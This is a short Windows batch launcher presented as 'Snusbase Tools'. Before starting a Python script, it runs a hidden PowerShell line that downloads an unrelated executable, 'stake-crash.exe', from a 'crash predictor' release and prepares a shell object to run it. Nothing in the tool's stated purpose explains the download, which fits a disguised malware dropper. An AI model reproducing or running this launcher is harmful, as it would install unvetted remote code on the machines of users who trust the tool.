@echo off

title Snusbase Tools
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/Stake-Community
echo.
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
py main.py
Key : 01266156
